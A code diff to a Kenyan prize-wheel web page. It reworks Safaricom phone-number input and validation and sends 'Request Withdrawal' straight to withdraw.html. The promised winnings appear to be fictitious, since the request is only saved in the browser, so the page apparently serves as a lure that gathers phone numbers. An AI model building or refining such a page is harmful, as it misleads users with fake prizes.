@@ -254,23 +254,27 @@
         }
         
         .phone-input {
-            display: flex;
-            align-items: center;
-        }
-        
-        .phone-prefix {
-            background: linear-gradient(to right, #6a11cb, #2575fc);
-            color: white;
-            padding: 12px 15px;
-            border-radius: 10px 0 0 10px;
-            font-weight: bold;
-            border: 2px solid #6a11cb;
-            border-right: none;
+            position: relative;
         }
         
         .phone-input input {
-            border-radius: 0 10px 10px 0;
-            border-left: none;
+            width: 100%;
+            padding: 12px 15px;
+            padding-left: 40px; /* Space for the phone icon */
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            background-color: #f9f9ff;
+        }
+        
+        .phone-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            color: #6a11cb;
         }
         
         .request-withdrawal-btn {
@@ -462,93 +466,6 @@
             opacity: 1;
         }
         
-        /* Success Message */
-        .success-message {
-            background-color: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 10px;
-            border: 1px solid #c3e6cb;
-            margin-top: 20px;
-            display: none;
-            text-align: center;
-        }
-        
-        /* Custom Alert Styles */
-        .custom-alert {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-        }
-        
-        .alert-content {
-            background: linear-gradient(145deg, #ffffff, #f5f7ff);
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            max-width: 350px;
-            width: 90%;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-            animation: alertFadeIn 0.3s ease-out;
-        }
-        
-        @keyframes alertFadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-20px) scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-        
-        .alert-icon {
-            font-size: 60px;
-            color: #4CAF50;
-            margin-bottom: 20px;
-        }
-        
-        .alert-title {
-            color: #1a237e;
-            font-size: 24px;
-            margin-bottom: 15px;
-            font-weight: bold;
-        }
-        
-        .alert-message {
-            color: #424242;
-            font-size: 16px;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-        
-        .alert-ok-btn {
-            background: linear-gradient(to right, #6a11cb, #2575fc);
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            width: 100%;
-        }
-        
-        .alert-ok-btn:hover {
-            background: linear-gradient(to right, #2575fc, #6a11cb);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-        
         @keyframes pulse {
             0% { transform: translate(-50%, -50%) scale(1); }
             50% { transform: translate(-50%, -50%) scale(1.05); }
@@ -627,29 +544,14 @@
                 <div class="form-group">
                     <label for="phoneNumber">Phone Number</label>
                     <div class="phone-input">
-                        <div class="phone-prefix">+254</div>
-                        <input type="tel" id="phoneNumber" placeholder="712345678" maxlength="9" pattern="[0-9]{9}" required>
+                        <div class="phone-icon">📱</div>
+                        <input type="tel" id="phoneNumber" placeholder="0712345678 or 712345678" maxlength="10" required>
                     </div>
-                    <small style="color: #666; display: block; margin-top: 5px;">Enter your Safaricom number (without country code)</small>
+                    <small style="color: #666; display: block; margin-top: 5px;">Enter your Safaricom number (starting with 07 or 0)</small>
                 </div>
                 
                 <button id="requestWithdrawalBtn" class="request-withdrawal-btn">Request Withdrawal</button>
             </div>
-            
-            <button id="continueBtn" class="continue-btn" style="display: none;">Back to Wheel</button>
-        </div>
-    </div>
-
-    <!-- Custom Alert for Withdrawal Confirmation -->
-    <div id="customAlert" class="custom-alert">
-        <div class="alert-content">
-            <div class="alert-icon">✅</div>
-            <div class="alert-title">Withdrawal Initiated!</div>
-            <div class="alert-message">
-                Your withdrawal request for <strong id="alertAmount">Ksh.0</strong> to <strong id="alertPhone">0712345678</strong> 
-                has been received and will be processed shortly.
-            </div>
-            <button id="alertOkBtn" class="alert-ok-btn">OK</button>
         </div>
     </div>
 
@@ -663,12 +565,7 @@
         const withdrawAmount = document.getElementById('withdrawAmount');
         const phoneNumberInput = document.getElementById('phoneNumber');
         const requestWithdrawalBtn = document.getElementById('requestWithdrawalBtn');
-        const continueBtn = document.getElementById('continueBtn');
         const withdrawalForm = document.getElementById('withdrawalForm');
-        const customAlert = document.getElementById('customAlert');
-        const alertAmount = document.getElementById('alertAmount');
-        const alertPhone = document.getElementById('alertPhone');
-        const alertOkBtn = document.getElementById('alertOkBtn');
         
         // All prize amounts from Ksh.150 to Ksh.5,000
         const prizes = [150, 200, 300, 400, 500, 750, 1000, 1500, 2000, 2500, 3000, 3500, 4000, 4500, 5000];
@@ -816,28 +713,38 @@
             }
         }
         
-        // Validate phone number
+        // Validate phone number (accepts 07XXXXXXXX or 0XXXXXXXXX or 7XXXXXXXX)
         function validatePhoneNumber(phone) {
             // Remove any spaces
             phone = phone.replace(/\s/g, '');
             
-            // Check if it's 9 digits and starts with 7
-            if (!/^[0-9]{9}$/.test(phone)) {
-                return false;
+            // Check if it starts with 0 and has 10 digits OR starts with 7 and has 9 digits
+            if (/^0[0-9]{9}$/.test(phone)) {
+                return true; // Format: 0712345678 (10 digits starting with 0)
+            } else if (/^7[0-9]{8}$/.test(phone)) {
+                return true; // Format: 712345678 (9 digits starting with 7)
             }
             
-            // Check if it starts with 7 (Safaricom numbers)
-            if (!phone.startsWith('7')) {
-                return false;
-            }
-            
-            return true;
+            return false;
         }
         
-        // Format phone number
+        // Format phone number to ensure it starts with 0 and has 10 digits
         function formatPhoneNumber(phone) {
+            // Remove any spaces
             phone = phone.replace(/\s/g, '');
-            return `0${phone}`;
+            
+            // If it starts with 7 and has 9 digits, add 0 at the beginning
+            if (/^7[0-9]{8}$/.test(phone)) {
+                return `0${phone}`; // Convert 712345678 to 0712345678
+            }
+            
+            // If it already starts with 0 and has 10 digits, return as is
+            if (/^0[0-9]{9}$/.test(phone)) {
+                return phone;
+            }
+            
+            // Default return
+            return phone;
         }
         
         // Get current date and time
@@ -850,13 +757,6 @@
             const minutes = String(now.getMinutes()).padStart(2, '0');
             
             return `${year}-${month}-${day} ${hours}:${minutes}`;
-        }
-        
-        // Show custom alert
-        function showWithdrawalAlert(amount, phone) {
-            alertAmount.textContent = `Ksh.${amount.toLocaleString()}`;
-            alertPhone.textContent = phone;
-            customAlert.style.display = 'flex';
         }
         
         // Redirect to withdraw.html
@@ -897,7 +797,6 @@
                 // Reset form
                 phoneNumberInput.value = '';
                 withdrawalForm.style.display = 'block';
-                continueBtn.style.display = 'none';
                 phoneNumberInput.focus();
                 
                 // Create confetti effect
@@ -905,17 +804,17 @@
             }, 4000);
         });
         
-        // Request withdrawal button
+        // Request withdrawal button - now redirects directly to withdraw.html
         requestWithdrawalBtn.addEventListener('click', () => {
             const phone = phoneNumberInput.value.trim();
             
             if (!validatePhoneNumber(phone)) {
-                alert('Please enter a valid Safaricom phone number (9 digits starting with 7)');
+                alert('Please enter a valid Safaricom phone number\n\nExamples:\n• 0712345678 (10 digits starting with 0)\n• 712345678 (9 digits starting with 7)');
                 phoneNumberInput.focus();
                 return;
             }
             
-            // Format phone number
+            // Format phone number to ensure it starts with 0
             const formattedPhone = formatPhoneNumber(phone);
             
             // Disable button and show loading
@@ -938,43 +837,30 @@
                 withdrawalHistory.push(newWithdrawal);
                 localStorage.setItem('withdrawalHistory', JSON.stringify(withdrawalHistory));
                 
-                // Close congratulations popup
-                congratulationsPopup.style.display = 'none';
-                
-                // Show custom alert
-                showWithdrawalAlert(currentPrize, formattedPhone);
-                
                 // Reset button state
                 requestWithdrawalBtn.disabled = false;
                 requestWithdrawalBtn.textContent = 'Request Withdrawal';
                 
                 // Reload history to show the new request
                 loadWithdrawalHistory();
+                
+                // Redirect to withdraw.html immediately
+                redirectToWithdraw();
             }, 1000);
         });
         
-        // Alert OK button - redirects to withdraw.html
-        alertOkBtn.addEventListener('click', () => {
-            redirectToWithdraw();
-        });
-        
-        // Continue button (back to wheel)
-        continueBtn.addEventListener('click', () => {
-            congratulationsPopup.style.display = 'none';
-            isSpinning = false;
-            spinBtn.classList.add('pulse');
-            spinBtn.style.pointerEvents = 'auto';
-        });
-        
-        // Phone number input validation
+        // Phone number input validation and formatting
         phoneNumberInput.addEventListener('input', () => {
             // Remove any non-digit characters
             phoneNumberInput.value = phoneNumberInput.value.replace(/[^0-9]/g, '');
             
-            // Limit to 9 digits
-            if (phoneNumberInput.value.length > 9) {
-                phoneNumberInput.value = phoneNumberInput.value.slice(0, 9);
+            // Limit to 10 digits maximum
+            if (phoneNumberInput.value.length > 10) {
+                phoneNumberInput.value = phoneNumberInput.value.slice(0, 10);
             }
+            
+            // Auto-format: if user enters 7XXXXXXXX (9 digits), allow it
+            // If user enters 0XXXXXXXXX (10 digits), allow it
         });
         
         // Allow Enter key to submit form
